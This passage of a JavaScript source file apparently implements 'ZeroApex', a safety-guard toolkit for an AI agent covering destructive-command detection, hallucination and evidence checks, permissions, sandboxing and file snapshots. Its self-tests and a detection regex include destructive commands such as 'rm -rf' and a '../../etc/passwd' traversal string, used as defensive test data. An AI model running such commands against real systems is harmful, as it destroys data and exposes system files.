        var limit = params.limit != null ? params.limit : 20;
        var snap = defaultAudit.snapshot();
        if (snap.length > limit) snap = snap.slice(snap.length - limit);
        return { success: true, code: "OK", count: snap.length, entries: snap };
    }

    async function evaluate_permission(params) {
        if (!defaultPermissions) {
            return { success: false, code: "E5002_DEPENDENCY_MISSING", error: "PermissionRules 未初始化" };
        }
        // Ensure the manifest is loaded before consulting it. Without this,
        // a first-call evaluate_permission() would see the builtin minimal
        // manifest (no permission rules) and silently return FALLTHROUGH.
        if (defaultManifest && typeof defaultManifest.loadAsync === "function") {
            try { await defaultManifest.loadAsync(); } catch (e) {}
        }
        // Accept both {tool, command/path} (primary) and {tool, pattern} (alias).
        var tool = params.tool || "bash";
        // Pattern is a friendly alias: map it to command/path based on tool.
        var p = Object.assign({}, params);
        if (p.pattern && !p.command && !p.path) {
            if (tool === "read" || tool === "edit" || tool === "write") p.path = p.pattern;
            else p.command = p.pattern;
        }
        var result = defaultPermissions.evaluate(tool, p);
        var value = defaultPermissions.extractValue(defaultPermissions.normalizeTool(tool, p), p);
        return {
            success: true, code: "OK", tool: tool, value: value,
            verdict: result.verdict, reason: result.reason,
            mode: result.mode, matched_rule: result.matched_rule || null,
        };
    }

    async function check_sandbox(params) {
        if (!defaultSandbox) {
            return { success: false, code: "E5002_DEPENDENCY_MISSING", error: "SandboxProfile 未初始化" };
        }
        // Ensure the manifest is loaded before consulting it. Without this,
        // a first-call check_sandbox() would see the builtin minimal manifest
        // (no profiles) and silently allow everything.
        if (defaultManifest && typeof defaultManifest.loadAsync === "function") {
            try { await defaultManifest.loadAsync(); } catch (e) {}
        }
        var result = defaultSandbox.check(params);
        return {
            success: true, code: "OK",
            profile: params.profile || defaultSandbox.getDefaultProfile(),
            target: params.path || params.command || "",
            allowed: result.allowed, verdict: result.verdict,
            reason: result.reason || null, matched_pattern: result.matched_pattern || null,
        };
    }

    function safeStr(e) {
        if (!e) return "";
        if (e.message) return String(e.message).slice(0, 120);
        return String(e).slice(0, 120);
    }

    async function config_get(params) {
        var key = params && params.key;
        if (key) {
            return { success: true, key: key, value: ConfigRegistry.get(key) };
        }
        return { success: true, code: "OK", config: ConfigRegistry.export() };
    }

    async function config_set(params) {
        if (!params || !params.key) {
            return { success: false, code: ErrorCode.MISSING_REQUIRED, error: "缺少 key 参数" };
        }
        ConfigRegistry.register(params.key, params.value);
        return { success: true, code: "OK", key: params.key, value: params.value };
    }

     return {
         FileGuard: FileGuard,
         ShellGuard: ShellGuard,
         Hallucination: Hallucination,
         Evidence: defaultInstance.Evidence,
         SelfMonitor: SelfMonitor,
         OutputFirewall: OutputFirewall,
         OpenSource: defaultInstance.OpenSource,
         Memory: defaultInstance.Memory,
         Snapshot: defaultInstance.Snapshot,
         preflightGate: defaultInstance.preflight,  // legacy alias: same as preflight
         enforce_block: enforce_block,
         audit_log: audit_log,
         evaluate_permission: evaluate_permission,
         check_sandbox: check_sandbox,
         config_get: config_get,
         config_set: config_set,
         tombstone_file: tombstone_file,
         create: create,
         wrapToolExecution: wrapToolExecution,
         _infra: defaultInstance._infra,
     };
})();

// ==========================================================================
// Tool export layer: map internal engine to Operit tool interface.
// Each tool wraps execution, catches exceptions, audits, enforces block.
// ==========================================================================

    async function preflight(params) {
        params = params || {};
        // Accept multiple input shapes for caller convenience:
        //   { goal, command, evidence, files_read, bypass }   — primary
        //   { action, command, files }                        — backward-compat (action→goal, files→files_read)
        //   { intent, ... }                                   — alternate alias
        //   { goals: [...] }                                  — batch mode (U3)
        var goal = params.goal || params.action || params.intent || null;
        // If a destructive string is in goal, treat it as the command too
        // so file_guard (which needs command) catches it.
        var command = params.command || (typeof goal === "string" && /rm\s|chmod|kill|shutdown|reboot|drop|delete/i.test(goal) ? goal : null);
        var evidence = params.evidence || null;
        var filesRead = params.files_read;
        if (filesRead === undefined) filesRead = params.files || [];
        var bypass = Array.isArray(params.bypass) ? params.bypass : [];

        // U3: batch preflight — multiple goals at once, each gets its own
        // task_id in the ledger. Return aggregate allowed + per-goal detail.
        if (Array.isArray(params.goals) && params.goals.length > 0) {
            var items = [];
            var allAllowed = true;
            for (var gi = 0; gi < params.goals.length; gi++) {
                var g = params.goals[gi] || {};
                var gGoal = g.goal || g.action || g.intent || null;
                var gCommand = g.command || (typeof gGoal === "string" && /rm\s|chmod|kill|shutdown|reboot|drop|delete/i.test(gGoal) ? gGoal : null);
                var gEv = g.evidence !== undefined ? g.evidence : evidence;
                var gFiles = g.files_read !== undefined ? g.files_read : (g.files !== undefined ? g.files : filesRead);
                var r = await ZeroApex.preflightGate(gGoal, gCommand, gEv, gFiles, { bypass: bypass });
                if (!r.allowed) allAllowed = false;
                items.push({
                    index: gi,
                    goal: gGoal,
                    command: gCommand,
                    task_id: r.task_id,
                    allowed: r.allowed,
                    state: r.state,
                    reasons: r.reasons,
                    gates: r.gates,
                });
            }
            return {
                success: true,
                code: "OK",
                batch: true,
                total: items.length,
                allowed: allAllowed,
                items: items,
                bypassed_gates: bypass,
            };
        }

        return await ZeroApex.preflightGate(goal, command, evidence, filesRead, { bypass: bypass });
    }

async function file_guard(params) {
    var result;
    if (params.script) {
        result = ZeroApex.FileGuard.scanScript(params.script);
    } else if (params.path && !params.command) {
        // SE2: pass operation so writeOnly entries work correctly
        result = ZeroApex.FileGuard.pathRisk(params.path, params.operation || "unknown");
    } else {
        result = ZeroApex.FileGuard.analyzeCommand(params.command || "");
    }
    // A1: normalize to unified {success, code, ...} protocol
    result.success = !result.requires_confirmation;
    result.code = result.requires_confirmation
        ? (result.is_delete ? ErrorCode.GUARD_BLOCK : ErrorCode.CONFIRMATION_REQUIRED)
        : ErrorCode.OK;
    return result;
}

async function hallucination_guard(params) {
    var result = ZeroApex.Hallucination.check(params.text, params.evidence);
    // A1: normalize to unified {success, code, ...} protocol
    result.success = !result.block;
    result.code = result.block ? ErrorCode.HALLUCINATION_BLOCK : ErrorCode.OK;
    return result;
}

    async function evidence_check(params) {
        params = params || {};
        var ctx = {
            exit_code: params.exit_code,
            stdout: params.stdout,
            stderr: params.stderr,
            artifact_path: params.artifact_path,
        };
        // Parse 'supports' array: ["exit_code:0", "stdout:build passed", "artifact:path", "stderr:error msg"]
        if (params.supports && params.supports.length > 0) {
            for (var i = 0; i < params.supports.length; i++) {
                var s = String(params.supports[i]);
                var colonIdx = s.indexOf(':');
                if (colonIdx > 0) {
                    var key = s.slice(0, colonIdx);
                    var val = s.slice(colonIdx + 1);
                    if (key === 'exit_code') {
                        ctx.exit_code = parseInt(val, 10);
                    } else if (key === 'stdout') {
                        ctx.stdout = val;
                    } else if (key === 'stderr') {
                        ctx.stderr = val;
                    } else if (key === 'artifact') {
                        ctx.artifact_path = val;
                    }
                }
            }
        }
        var classified = await ZeroApex.Evidence.classify(params.claim || "", ctx);
        // Normalize to the standard {success, code, ...} envelope used by all
        // other exports. Without this, callers cannot use a single
        // `if (r.success)` check across tools.
        return {
            success: true,
            code: "OK",
            claim: params.claim || "",
            level: classified.level,
            level_num: classified.level_num,
            label: classified.label,
            supports_claim: classified.supports_claim,
            can_claim_done: classified.can_claim_done,
            can_claim_delivered: classified.can_claim_delivered,
            reasons: classified.reasons || [],
            gate: classified.gate,
        };
    }

async function self_monitor(params) {
    return ZeroApex.SelfMonitor.assess({
        goal: params.goal,
        goal_clear: params.goal_clear,
        files_read: params.files_read,
        evidence_ready: params.evidence_ready,
        irreversible_risk: params.irreversible_risk,
    });
}

async function output_firewall(params) {
    return ZeroApex.OutputFirewall.check(params.text);
}

async function search_opensource(params) {
    return await ZeroApex.OpenSource.search(
        params.keyword,
        params.language,
        params.min_stars,
        params.limit
    );
}

async function remember(params) {
    return await ZeroApex.Memory.remember(
        params.kind,
        params.project,
        params.summary,
        params.evidence,
        params.tech_stack
    );
}

async function recall(params) {
    return await ZeroApex.Memory.recall(params.query, params.kind, params.limit);
}

// §NEW reasoning_chain — start/step/conclude a ReAct reasoning chain
async function reasoning_chain(params) {
    params = params || {};
    var RC = ZeroApex.ReasoningChain;
    var action = params.action || "create";
    if (action === "create") {
        var chain = RC.create(params.goal || "");
        return { success: true, code: "OK", chain: chain };
    }
    if (action === "thought") {
        var ch = params.chain;
        if (!ch) return { success: false, code: "E1002_MISSING_REQUIRED", error: "chain 参数必填" };
        RC.thought(ch, params.text || "");
        return { success: true, code: "OK", chain: ch };
    }
    if (action === "action") {
        var ch = params.chain;
        if (!ch) return { success: false, code: "E1002_MISSING_REQUIRED", error: "chain 参数必填" };
        RC.action(ch, params.tool || "", params.params || {});
        return { success: true, code: "OK", chain: ch };
    }
    if (action === "observation") {
        var ch = params.chain;
        if (!ch) return { success: false, code: "E1002_MISSING_REQUIRED", error: "chain 参数必填" };
        RC.observation(ch, params.result || "", params.success !== false);
        return { success: true, code: "OK", chain: ch };
    }
    if (action === "conclude") {
        var ch = params.chain;
        if (!ch) return { success: false, code: "E1002_MISSING_REQUIRED", error: "chain 参数必填" };
        RC.conclude(ch, params.conclusion || "", params.success !== false);
        return { success: true, code: "OK", chain: ch, summary: RC.summarize(ch) };
    }
    if (action === "summarize") {
        var ch = params.chain;
        if (!ch) return { success: false, code: "E1002_MISSING_REQUIRED", error: "chain 参数必填" };
        return { success: true, code: "OK", summary: RC.summarize(ch) };
    }
    return { success: false, code: "E1001_INVALID_PARAMS", error: "未知 action: " + action };
}

// §NEW task_plan — create and manage hierarchical task decomposition
async function task_plan(params) {
    params = params || {};
    var TP = ZeroApex.TaskPlanner;
    var action = params.action || "create";
    if (action === "create") {
        var plan = TP.createPlan(params.goal || "");
        return { success: true, code: "OK", plan: plan };
    }
    if (action === "add_task") {
        var plan = params.plan;
        if (!plan) return { success: false, code: "E1002_MISSING_REQUIRED", error: "plan 参数必填" };
        var id = TP.addTask(plan, params.parent_id || null, {
            name: params.name || "",
            goal: params.goal || params.name || "",
            tool: params.tool || null,
            params: params.task_params || {},
            requires: params.requires || [],
            priority: params.priority || 0,
        });
        return { success: !!id, code: id ? "OK" : "E1001_INVALID_PARAMS", node_id: id, plan: plan };
    }
    if (action === "start_node") {
        var plan = params.plan;
        if (!plan || !params.node_id) return { success: false, code: "E1002_MISSING_REQUIRED", error: "plan/node_id 必填" };
        var ok = TP.startNode(plan, params.node_id);
        return { success: ok, code: ok ? "OK" : "E1001_INVALID_PARAMS", plan: plan };
    }
    if (action === "ready") {
        var plan = params.plan;
        if (!plan) return { success: false, code: "E1002_MISSING_REQUIRED", error: "plan 参数必填" };
        return { success: true, code: "OK", ready: TP.readyNodes(plan) };
    }
    if (action === "complete_node") {
        var plan = params.plan;
        if (!plan || !params.node_id) return { success: false, code: "E1002_MISSING_REQUIRED", error: "plan/node_id 必填" };
        TP.completeNode(plan, params.node_id, params.result || null, params.success !== false);
        return { success: true, code: "OK", plan: plan, summary: TP.summary(plan) };
    }
    if (action === "summary") {
        var plan = params.plan;
        if (!plan) return { success: false, code: "E1002_MISSING_REQUIRED", error: "plan 参数必填" };
        return { success: true, code: "OK", summary: TP.summary(plan) };
    }
    return { success: false, code: "E1001_INVALID_PARAMS", error: "未知 action: " + action };
}

// §NEW reflexion — record failures and query past reflections
async function reflexion(params) {
    params = params || {};
    var RF = ZeroApex.Reflexion;
    var action = params.action || "reflect";
    if (action === "reflect") {
        var entry = RF.reflect({
            goal: params.goal || "",
            tool: params.tool || "",
            error: params.error || "",
            evidence: params.evidence || "",
            chain_summary: params.chain_summary || "",
            severity: params.severity || RF.SEVERITY.MEDIUM,
        });
        // Persist to Memory async (fire-and-forget)
        if (ZeroApex.Memory) {
            var p2 = RF.persist(ZeroApex.Memory);
            if (p2 && typeof p2.catch === "function") p2.catch(function () {});
        }
        return { success: true, code: "OK", entry: entry, rule: entry.rule };
    }
    if (action === "query") {
        var results = RF.query(params.goal || "", params.tool || "", params.limit || 5);
        return { success: true, code: "OK", reflections: results, count: results.length };
    }
    if (action === "context_hint") {
        var hint = RF.contextHint(params.goal || "", params.tool || "");
        return { success: true, code: "OK", hint: hint, has_hint: hint.length > 0 };
    }
    if (action === "snapshot") {
        return { success: true, code: "OK", reflections: RF.snapshot(), count: RF.size() };
    }
    return { success: false, code: "E1001_INVALID_PARAMS", error: "未知 action: " + action };
}

// §NEW validate_output — schema-based output validation (Guardrails AI style)
async function validate_output(params) {
    params = params || {};
    var OV = ZeroApex._infra.OutputValidator;
    var data = params.data;
    var schema = params.schema;
    // Allow referencing built-in schemas by name
    if (typeof schema === "string") schema = OV.getSchema(schema);
    if (!schema) return { success: false, code: "E1002_MISSING_REQUIRED", error: "schema 必填（object 或内置名称: preflight_result/file_guard_result/evidence_result）" };
    var result = OV.validate(data, schema);
    if (!result.valid && params.coerce) {
        var coerced = OV.coerce(data, schema);
        var result2 = OV.validate(coerced, schema);
        return { success: result2.valid, code: result2.valid ? "OK" : "E1001_INVALID_PARAMS", valid: result2.valid, errors: result2.errors, data: coerced, coerced: true };
    }
    return { success: result.valid, code: result.valid ? "OK" : "E1001_INVALID_PARAMS", valid: result.valid, errors: result.errors, data: data };
}

// §NEW evidence_collect — cross-step evidence aggregation
async function evidence_collect(params) {
    params = params || {};
    var EC = ZeroApex._infra.EvidenceCollector;
    var action = params.action || "create";
    if (action === "create") {
        return { success: true, code: "OK", collector: EC.create(params.task_id || null) };
    }
    if (action === "add") {
        var c = params.collector;
        if (!c) return { success: false, code: "E1002_MISSING_REQUIRED", error: "collector 必填" };
        EC.add(c, params.source || "", params.data || params.result || "");
        return { success: true, code: "OK", collector: c, count: c.entries.length };
    }
    if (action === "consolidate") {
        var c = params.collector;
        if (!c) return { success: false, code: "E1002_MISSING_REQUIRED", error: "collector 必填" };
        return { success: true, code: "OK", evidence: EC.consolidate(c, params.max_len || 2000), all_succeeded: EC.allSucceeded(c), best_grade: EC.bestGrade(c) };
    }
    if (action === "snapshot") {
        var c = params.collector;
        if (!c) return { success: false, code: "E1002_MISSING_REQUIRED", error: "collector 必填" };
        return { success: true, code: "OK", entries: EC.snapshot(c) };
    }
    return { success: false, code: "E1001_INVALID_PARAMS", error: "未知 action: " + action };
}


async function snapshot_file(params) {
    return await ZeroApex.Snapshot.snapshot(params.path);
}

async function restore_file(params) {
    return await ZeroApex.Snapshot.restore(params.path, params.snapshot_name);
}

async function tombstone_file(params) {
    return await ZeroApex.Snapshot.tombstone(params.path);
}

async function snapshot_cleanup(params) {
    params = params || {};
    // Bug#5 fix: if {path} is a file path (e.g. "/tmp/test.txt"), derive the
    // directory so trashDir() targets the correct .trash folder.
    // {base_path} is always used as-is; {path} is interpreted as a directory
    // unless its last segment contains a dot (i.e. looks like a filename).
    var rawPath = params.path;
    var derivedBase;
    if (rawPath) {
        var lastSeg = rawPath.replace(/\/$/, "").split("/").pop() || "";
        // Has a dot in last segment and doesn't end with slash → treat as file
        if (lastSeg.indexOf(".") >= 0) {
            var parts = rawPath.split("/");
            parts.pop();
            derivedBase = parts.join("/") || "/";
        } else {
            derivedBase = rawPath;
        }
    }
    return await ZeroApex.Snapshot.cleanup({
        base_path: params.base_path || derivedBase || "/workspace",
        max_age_hours: params.max_age_hours || 24,
        max_count: params.max_count || 50,
    });
}


// Self-test entry: pure logic layer only, verifies engine runs.
async function main() {
    var report = [];
    var r1 = ZeroApex.FileGuard.analyzeCommand("rm -rf /home/user/project");
    report.push({ test: "rm -rf 检测", pass: r1.is_delete && r1.requires_confirmation });
    var r2 = ZeroApex.FileGuard.analyzeCommand("ls -la /sdcard");
    report.push({ test: "ls 不误判删除", pass: !r2.is_delete });
    var r3 = ZeroApex.FileGuard.scanScript('os.system("rm -rf /tmp")');
    report.push({ test: "脚本间接删除检测", pass: r3.is_delete });
    var h1 = await ZeroApex.Hallucination.check("编译通过了", null);
    report.push({ test: "无证据完成声明拦截", pass: !h1.allowed });
    var h2 = await ZeroApex.Hallucination.check("编译通过了", "BUILD SUCCESSFUL");
    report.push({ test: "有证据完成声明放行", pass: h2.allowed });
    var e1 = await ZeroApex.Evidence.classify("编译通过", {
        exit_code: 0,
        stdout: "BUILD SUCCESSFUL",
    });
    report.push({ test: "编译成功=L3且可宣称完成", pass: e1.level === "L3" && e1.can_claim_done });
    var e2 = await ZeroApex.Evidence.classify("编译通过", {
        exit_code: 1,
        stderr: "BUILD FAILED",
    });
    report.push({ test: "编译失败被否证", pass: !e2.supports_claim });
    var s1 = ZeroApex.SelfMonitor.assess({ goal: "修复登录崩溃", files_read: false });
    report.push({ test: "改动类未读文件生成阻塞", pass: s1.blockers.length > 0 });
    var o1 = ZeroApex.OutputFirewall.check("我认为这个应该没问题");
    report.push({ test: "思考泄漏检测", pass: !o1.clean });

    // New tests for refactored infrastructure
    var p1 = PathUtils_hasTraversal();
    report.push({ test: "PathUtils 路径遍历检测", pass: p1 });
    var p2 = PathUtils_join();
    report.push({ test: "PathUtils 安全拼接", pass: p2 });
    var c1 = LRU_test();
    report.push({ test: "LRU 缓存淘汰", pass: c1 });
    var t1 = Template_test();
    report.push({ test: "TemplateStore 模板渲染", pass: t1 });
    var ch1 = Chunker_test();
    report.push({ test: "OutputChunker 分段", pass: ch1 });
    var cfg1 = Config_test();
    report.push({ test: "ConfigRegistry 读取/缺失", pass: cfg1 });
    var ec1 = ErrorCode_test();
    report.push({ test: "ErrorCode 枚举稳定", pass: ec1 });
    var lock1 = await FileLock_test();
    report.push({ test: "FileLock 互斥", pass: lock1 === true });
    var lim1 = await Concurrency_test();
    report.push({ test: "ConcurrencyLimiter 限流", pass: lim1 === true });
    var tl1 = TaskLedger_test();
    report.push({ test: "TaskLedger 优先级队列", pass: tl1 });

    var passed = report.filter(function (x) { return x.pass; }).length;
    return {
        engine: "zero_apex",
        runtime: "Operit Sandbox (QuickJS)",
        total: report.length,
        passed: passed,
        failed: report.length - passed,
        all_pass: passed === report.length,
        detail: report,
    };
}

// --- Infrastructure self-test helpers ---
function PathUtils_hasTraversal() {
    var infra = ZeroApex._infra;
    return infra.PathUtils.hasTraversal("../../etc/passwd") &&
           !infra.PathUtils.hasTraversal("/home/user/code");
}
function PathUtils_join() {
    var infra = ZeroApex._infra;
    var j = infra.PathUtils.join("/home/user", "project", "src//main");
    return j === "/home/user/project/src/main";
}
function LRU_test() {
    var cache = new ZeroApex._infra.LRUCache(2);
    cache.set("a", 1);
    cache.set("b", 2);
    cache.set("c", 3); // evicts a
    return cache.get("a") === undefined && cache.get("b") === 2 && cache.get("c") === 3;
}
function Template_test() {
    var infra = ZeroApex._infra;
    var out = infra.TemplateStore.render("status_card", {
        readiness: 90, confidence: "VERIFIED", causal: "deep", blockers: ""
    });
    return out.indexOf("90/100") >= 0 && out.indexOf("VERIFIED") >= 0;
}
function Chunker_test() {
    var infra = ZeroApex._infra;
    var big = "";
    for (var i = 0; i < 1000; i++) big += "line " + i + "\n";
    var parts = infra.OutputChunker.chunk(big, 1000);
    return parts.length > 1;
}
function Config_test() {
    var infra = ZeroApex._infra;
    var v = infra.ConfigRegistry.get("hallucination.valid_labels");
    var threw = false;
    try { infra.ConfigRegistry.get("__nonexistent__"); } catch (e) { threw = true; }
    return Array.isArray(v) && v.indexOf("VERIFIED") >= 0 && threw;
}
function ErrorCode_test() {
    var ec = ZeroApex._infra.ErrorCode;
    return ec.OK === "OK" && ec.NETWORK_ERROR === "E3001_NETWORK_ERROR" && ec.GUARD_BLOCK === "E4001_GUARD_BLOCK";
}
function FileLock_test() {
    var lock = new ZeroApex._infra.FileLock();
    var order = [];
    // Run two critical sections in sequence; the second must wait for the
    // first. Use a marker in the order array to detect violation of mutex.
    // Each section: 1) capture order.length, 2) push "-start", 3) async work,
    // 4) push "-end". If mutex is broken, both would start before the first
    // ended.
    function section(name) {
        return new Promise(function (resolve) {
            lock.withLock("/a", function () {
                var startIdx = order.length;
                // Mutex violation: if the previous entry is not "*-end",
                // the lock was broken.
                if (startIdx > 0) {
                    var prev = order[startIdx - 1];
                    if (prev !== "a-end" && prev !== "b-end") {
                        order.push("VIOLATION:" + prev);
                    }
                }
                order.push(name + "-start");
                return Promise.resolve().then(function () {
                    order.push(name + "-end");
                    resolve();
                });
            });
        });
    }
    return Promise.all([section("a"), section("b")]).then(function () {
        var ok = order.length === 4 &&
                 order[0] === "a-start" && order[1] === "a-end" &&
                 order[2] === "b-start" && order[3] === "b-end";
        return ok;
    });
}
function Concurrency_test() {
    var lim = new ZeroApex._infra.ConcurrencyLimiter(1);
    var ran = 0;
    var concurrent = 0;
    var maxConcurrent = 0;
    // Queue 3 jobs that each "block" briefly; maxConcurrent should stay <= 1
    // because the limiter is at capacity 1.
    var jobs = [];
    for (var i = 0; i < 3; i++) {
        jobs.push(lim.run(function () {
            ran++;
            concurrent++;
            if (concurrent > maxConcurrent) maxConcurrent = concurrent;
            return Promise.resolve().then(function () {
                concurrent--;
            });
        }));
    }
    return Promise.all(jobs).then(function () {
        return ran === 3 && maxConcurrent <= 1;
    });
}
function TaskLedger_test() {
    var ledger = new ZeroApex._infra.TaskLedger({});
    var id1 = ledger.enqueue({ goal: "low", priority: 1 });
    var id2 = ledger.enqueue({ goal: "high", priority: 10 });
    var first = ledger.next();
    return first.goal === "high" && ledger.pendingCount() === 1;
}

function wrapExport(toolFn, toolName) {
    return function (params) { return ZeroApex.wrapToolExecution(toolFn, params, toolName); };
}
exports.preflight = wrapExport(preflight, "preflight");
exports.file_guard = wrapExport(file_guard, "file_guard");
exports.hallucination_guard = wrapExport(hallucination_guard, "hallucination_guard");
exports.evidence_check = wrapExport(evidence_check, "evidence_check");
exports.self_monitor = wrapExport(self_monitor, "self_monitor");
exports.output_firewall = wrapExport(output_firewall, "output_firewall");
exports.search_opensource = wrapExport(search_opensource, "search_opensource");
exports.remember = wrapExport(remember, "remember");
exports.recall = wrapExport(recall, "recall");
exports.reasoning_chain = wrapExport(reasoning_chain, "reasoning_chain");
exports.task_plan = wrapExport(task_plan, "task_plan");
exports.reflexion = wrapExport(reflexion, "reflexion");
exports.validate_output = wrapExport(validate_output, "validate_output");
exports.evidence_collect = wrapExport(evidence_collect, "evidence_collect");
exports.snapshot_file = wrapExport(snapshot_file, "snapshot_file");
exports.restore_file = wrapExport(restore_file, "restore_file");
exports.snapshot_cleanup = wrapExport(snapshot_cleanup, "snapshot_cleanup");
exports.tombstone_file = wrapExport(tombstone_file, "tombstone_file");
exports.enforce_block = wrapExport(ZeroApex.enforce_block, "enforce_block");
exports.audit_log = wrapExport(ZeroApex.audit_log, "audit_log");
exports.evaluate_permission = wrapExport(ZeroApex.evaluate_permission, "evaluate_permission");
exports.check_sandbox = wrapExport(ZeroApex.check_sandbox, "check_sandbox");
exports.config_get = wrapExport(ZeroApex.config_get, "config_get");
exports.config_set = wrapExport(ZeroApex.config_set, "config_set");
exports.main = main;
exports.create = ZeroApex.create;
exports._infra = ZeroApex._infra;
exports.ZeroApex = ZeroApex;